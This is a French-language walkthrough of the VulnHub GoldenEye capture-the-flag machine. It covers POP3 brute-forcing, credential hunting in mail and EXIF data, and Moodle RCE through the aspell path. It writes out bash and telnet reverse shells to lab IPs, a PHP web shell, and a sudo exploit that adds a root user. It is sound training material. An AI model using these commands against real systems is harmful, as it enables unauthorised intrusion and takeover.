---
title: "Solution du CTF GoldenEye de VulnHub"
tags: [CTF, VulnHub]
---

[GoldenEye](https://vulnhub.com/entry/goldeneye-1,240/) était un CTF dans la lignée du précédent avec toute une série de web apps qu'on doit explorer à la recherche d'indices.

Le RCE m'a pris quelque temps, le temps de tester différentes possibilités et surtout parce que je voulais le faire sans Metasploit (car j'ai dû supprimer ma VM Kali par erreur).

## A base de POP-POP-POP

Quand on se rend sur le site web sur le port 80 on nous indique d'aller à l'URL `/sev-home`.

Cette URL demande une authentification basic.

En regardant de plus près la page d'index ou voit un javascript qui contient les commentaires suivants :

```html
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

On peut utiliser Python pour échapper les codes HTML :

```python
>>> from html import unescape
>>> unescape("&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;")
'InvincibleHack3r'
```

L'authentification passe alors avec `boris` / `InvincibleHack3r`.

On trouve des indications dans la page HTML :

```html
<div id="golden">
<h1>GoldenEye</h1>
<p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p>
<p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p>
<p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
</div>

<script src="index.js"></script>
 <!-- 
--- snip ---

Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris

 -->
```

En dehors du port 80 il y a trois ports ouverts :

```
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d
```

Les ports 55006 et 55007 servent du pop3 mais seul le premier est derrière TLS. À noter que les services supportant TLS sont ici vulnérables à `Poodle` (que l'on n'exploitera pas ici).

```
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://www.securityfocus.com/bid/70574
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
```

Dans l'ensemble, c'est assez étrange de nous inciter à envoyer un email (via le port 25) car je ne vois pas comment ça peut provoquer la réception du *GoldenEye Operators Training*.

J'ai tenté d'envoyer un email et j'ai lancé Wireshark pour voir si ça déclenchait une action sur le réseau, mais ce n'était pas le cas.

## Cette fois il est facile. Même toi tu devrais pouvoir le casser, toi qui a du bortsch dans la caboche.

La mention de POP3 et de *security by obscurity* peut laisser supposer qu'ils utilisent des mots de passe faible et comptent sur la présence du serveur POP sur un port non-standard pour être tranquilles.

Aussi, la description du CTF indiquait que tout ce dont on avait besoin était présent sur Kali Linux. J'ai d'abord tenté de bruteforcer les comptes avec la wordlist `rockyou` mais ça semblait ne mener nulle part.

Il s'avère que Kali a aussi une wordlist nommée `fasttrack` qui est plus courte :

[GitHub - 00xBAD/kali-wordlists: Default Kali Linux Wordlists (SecLists Included)](https://github.com/00xBAD/kali-wordlists)

J'ai d'abord tenté une attaque brute force avec le vénérable `THC Hydra`. J'ai remarqué (en surveillant le trafic) que par défaut il procédait à une authentification en base64 sur le POP3 :

```
Ym9yaXMAYm9yaXMAcGFsb21h
```

Ce qui se décode en `borisborispaloma`... Il semble qu'un bug double le nom d'utilisateur. En spécifiant une authentification en clair ça fonctionne :

```console
$ hydra -u -L users.txt -P wordlists/fasttrack.txt pop3://192.168.56.101:55007/CLEAR
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-05 12:17:38
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task
[DATA] attacking pop3://192.168.56.101:55007/CLEAR
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 364 to do in 00:05h, 16 active
[STATUS] 64.33 tries/min, 193 tries in 00:03h, 251 to do in 00:04h, 16 active
[55007][pop3] host: 192.168.56.101   login: natalya   password: bird
[55007][pop3] host: 192.168.56.101   login: boris   password: secret1!
```

`Hydra` s'est montré assez lent et semble mal gérer ses threads : à la fin, il reste à tourner un long moment sans activité réseau.

On peut aussi réaliser l'attaque avec `Ncrack`

```console
$ ncrack --passwords-first -U users.txt -P wordlists/fasttrack.txt --connection-limit 16 -T5 pop3://192.168.56.101:55007

Starting Ncrack 0.8 ( http://ncrack.org ) at 2023-05-05 12:37 CEST

Discovered credentials for pop3 on 192.168.56.101 55007/tcp:
192.168.56.101 55007/tcp pop3: 'natalya' 'bird'
192.168.56.101 55007/tcp pop3: 'boris' 'secret1!'

Ncrack done: 1 service scanned in 567.04 seconds.

Ncrack finished.
```

C'est déjà plus rapide.

`Nmap` dispose aussi d'un script NSE pour le brute force :

```console
$ nmap --script=+pop3-brute --script-args userdb=users.txt,passdb=wordlists/fasttrack.txt -p T:55007 192.168.56.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 12:50 CEST
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).

PORT      STATE SERVICE
55007/tcp open  unknown
| pop3-brute: 
|   Accounts: 
|     natalya:bird - Valid credentials
|     boris:secret1! - Valid credentials
|_  Statistics: Performed 266 guesses in 230 seconds, average tps: 1.0

Nmap done: 1 IP address (1 host up) scanned in 229.82 seconds
```

`Ncrack` et `Nmap` attendent par défaut de finir l'attaque avant d'afficher les identifiants trouvés alors que `Hydra` les affiche au fur et à mesure.

Je recommanderais toutefois le script NSE pour les performances.

## Bonne chance pour une prochaine fois, tas de nullards ! Boum ! Envoyé ! Je suis bien l'invincible !

On peut alors se connecter eu POP3 pour lire les messages. D'abord ceux de `Natalya` :

```console
$ ncat --ssl -t 192.168.56.101 55006 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Subject: O=Dovecot mail server, OU=localhost, CN=localhost/emailAddress=root@localhost
Ncat: Issuer: O=Dovecot mail server, OU=localhost, CN=localhost/emailAddress=root@localhost
Ncat: SHA-1 fingerprint: 9D6A 92EB 5F9F E9BA 6CBD DC93 55FA 5754 219B 0B77
Ncat: Certificate verification failed (self-signed certificate).
Ncat: SSL connection to 192.168.56.101:55006. Dovecot mail server
Ncat: SHA-1 fingerprint: 9D6A 92EB 5F9F E9BA 6CBD DC93 55FA 5754 219B 0B77
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 3 messages:
1 631
2 1048
3 289
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes.
Also, you are GNO supervisor for training.
I will email you once a student is designated to you.

Also, be cautious of possible network breaches.
We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you.
As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...
even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

On a des identifiants ainsi qu'une nouvelle URL.

Et pour ceux de `Boris` :

```
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here.
I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye.
Place them in a hidden file within the root directory of this server then remove from this email.
There can only be one set of these acces codes, and we need to secure them for the final execution.
If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

## Bad Mood

L'URL http://severnaya-station.com/gnocertdir/ (après rajout de l'hôte dans `/etc/hosts`) s'avère être un `Moodle` (une plateforme d'e-learning). On peut s'y connecter avec les identifiants.

Je ne parviens pas à déterminer la version de l'appli, mais je peux chercher des exploits datant d'avant la date du CTF.

Je trouve par exemple cette faille SQL :

[Moodle 2.x/3.x - SQL Injection - PHP webapps Exploit](https://www.exploit-db.com/exploits/41828)

Les instructions sont assez simples :

> Log in as a regular user and note the URL of the Moodle site, the 'MoodleSession' cookie value and the 'sesskey' parameter along with your 'userid' from the page source.
> 
> Paste these values into the exploit script, fire the script, re-authenticate and you will be the site administrator.

On trouve deux des infos dans la page HTML :

```html
//<![CDATA[
var M = {}; M.yui = {}; var moodleConfigFn = function(me) {
--- snip ---
M.cfg = {"wwwroot":"http:\/\/severnaya-station.com\/gnocertdir","sesskey":"YFydkZz0W1","loadingicon":"http:\/\/severnaya-station.com\/gnocertdir\/theme\/image.php?theme=standard&image=i%2Floading_small&rev=281","themerev":"281","theme":"standard","jsrev":"280"};
//]]>
</script>
<script type="text/javascript" src="http://severnaya-station.com/gnocertdir/lib/javascript.php?file=%2Flib%2Fjavascript-static.js&amp;rev=280"></script>
<script type="text/javascript" src="http://severnaya-station.com/gnocertdir/theme/javascript.php?theme=standard&amp;rev=281&amp;type=head"></script>
</head>
<body id="page-user-profile" class=" path-user safari dir-ltr lang-en yui-skin-sam yui3-skin-sam severnaya-station-com--gnocertdir pagelayout-mydashboard course-1 context-1 side-pre-only">
--- snip ---
        <div class="headermenu"><div class="logininfo">You are logged in as <a href="http://severnaya-station.com/gnocertdir/user/profile.php?id=6">Xenia X</a> 
```

Et pour `MoodleSession` il s'agit du cookie.

J'ai édité le script PHP et j'ai dû corriger quelques trucs aussi, mais j'obtenais cette erreur PHP :

```
PHP Fatal error:  No code may exist outside of namespace {}
```

J'ai fini par laisser tomber et finalement en fouillant j'ai trouvé un message dans la messagerie de `Xenia` :

> Greetings Xenia,  
> 
> As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.  
> 
> My email username is...  
> 
> doak  
> 
> Thank you,  
> 
> Cheers,  

Au passage, il y a aussi cet encart qui s'affiche dans le `Moodle` :

> Greetings fellow operators. 
> 
> Once you've been approved for the GNO course we will update your account with the relevant training materials.
> 
> For any Questions message the admin of this service here. User: admin

J'ai continué de fouiller sur l'appli, mais je n'ai rien trouvé. Finalement j'ai aussi brute forcé le compte POP3 de `doak` :

```
PORT      STATE SERVICE
55007/tcp open  unknown
| pop3-brute: 
|   Accounts: 
|     doak:goat - Valid credentials
```

On obtenait alors des identifiants supplémentaires :

```
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

## Top secret

On se reconnecte une fois de plus sur le `Moodle` avec les nouveaux identifiants. Je trouve dans les dossiers personnels de l'utilisateur un fichier `s3cret.txt` :

```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

Regarder les tags EXIF de l'image mentionnée remonte un base64 :

```console
$ exiftool for-007.jpg 
ExifTool Version Number         : 12.60
File Name                       : for-007.jpg
--- snip ---
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
--- snip ---
```

Ce dernier se décode en `xWinter1995x!`. Je peux ensuite me connecter en tant qu'admin sur l'appli web.

J'ai fouillé un moment pour voir si'il y avait un moyen simple d'obtenir une exécution de code ou de commande et en allant dans `Administration > Server > System paths` j'ai remarqué l'entrée suivante pour le path attendu par `aspell` :

```bash
(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)
```

Il semble que l'auteur du CTF a testé tout comme il se doit, mais qu'il a oublié de nettoyer cette entrée.

L'exploitation semble correspondre à [moodle_spelling_binary_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/moodle_spelling_binary_rce.rb) de Metasploit. Je trouve aussi un exploit plus récent [moodle_spelling_path_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/moodle_spelling_path_rce.rb).

Dans tous les cas il faut que _TinyMCE_ soit défini dans les settings comme l'éditeur de texte et que le moteur de vérification syntaxique soit `PSpellShell` à sélectionner dans `Administration > Plugins > Text editors > Tiny MCE`.

Il faut ensuite trouver une page où il y a un éditeur de texte riche utilisant _TinyMCE_, par exemple via `Site administration > Courses > Add/edit courses`.

J'ai eu des difficultés à faire déclencher mon payload que j'avais passé comme valeur du path `aspell` :

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.56.1/80 0>&1'
```

En fait il fallait passer le chemin complet des binaires sans quoi ce n'est pas exécuté.

## Clap de fin

Mon premier réflexe a été de déposer un shell pour garder cet accès bien mérité :

```console
www-data@ubuntu:/var/www/html$ find . -type d -writable -maxdepth 1
find . -type d -writable -maxdepth 1
./dir007key
./006-final
./gnocertdir
./sev-home
www-data@ubuntu:/var/www/html$ echo '<?php system($_GET["cmd"]); ?>' > ./gnocertdir/shell.php
echo '<?php system($_GET["cmd"]); ?>' > ./gnocertdir/shell.php
```

Rien de bien utile dans la configuration du `Moodle` :

```php
www-data@ubuntu:/var/www/html/gnocertdir$ cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'pgsql';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'trevelyan006x';
```

Tous les utilisateurs sont en `nologin` :

```
boris:x:1000:1000:boris,,,:/home/boris:/usr/sbin/nologin
dovecot:x:103:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:104:113:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:105:114::/var/spool/postfix:/bin/false
postgres:x:106:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
natalya:x:1002:1002:,,,:/home/natalya:/usr/sbin/nologin
doak:x:1001:1001:,,,:/home/doak:/usr/sbin/nologin
```

`LinPEAS` a trouvé quelques points comme des identifiants qui se sont avérés inutiles :

```
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rwxr-xr-x 1 www-data www-data 86 Apr 23  2018 /etc/apache2/.htpasswd
boris:$apr1$vg2drJim$wUDKP9TLw5jq4GS5jq2240
ops:$apr1$mVvEblRU$oHDbEs4QP2YTUG25Z1PoP.
```

On a un *Ubuntu 14* :

```
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty
```

Ce dernier est vulnérable à différents exploits :

```
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

Je me suis tourné vers l'exploit `sudo` car userland (et donc moins de risques de crasher le système). Cet exploit est composé de différents scripts Python. Celui spécifique à *Ubuntu 14* échouait, mais un autre a fonctionné (le choix des scripts est documenté dans le `README` du projet). Il rajoute un utilisateur d'uid 0 nommé `gg` avec le mot de passe `gg`.

```console
www-data@ubuntu:/tmp/CVE-2021-3156$ python exploit_userspec.py 

curr size: 0x1600
*** Error in `sudoedit': malloc(): memory corruption: 0x00002b48aea9e7d0 ***

exit code: 6
--- snip ---

*** Error in `sudoedit': malloc(): memory corruption: 0x00002b9a054b45b0 ***

curr size: 0x13d0

exit code: 6


size_min: 0x13c0
found cmnd size: 0x13c0
found defaults, offset: 0x30
offset_max: 0x280
offset_min: 0x180
at range: 0x100-0x170

cmnd size: 0x13c0
offset to defaults: 0x30
offset to first userspec: 0x0
offset to userspec: 0x2f0

to skip finding offsets next time no this machine, run: 
exploit_userspec.py 0x13c0 0x30 0x0 0x2f0

Target sudo has bug. No idea to find first userspec.
So the exploit will fail if a running user is in sudoers and not in first two rules.
gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash
success at 113
www-data@ubuntu:/tmp/CVE-2021-3156$ su gg
Password: 
root@ubuntu:/tmp/CVE-2021-3156# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/tmp/CVE-2021-3156# cd /root
root@ubuntu:~# ls
root@ubuntu:~# ls -al
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
root@ubuntu:~# cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```
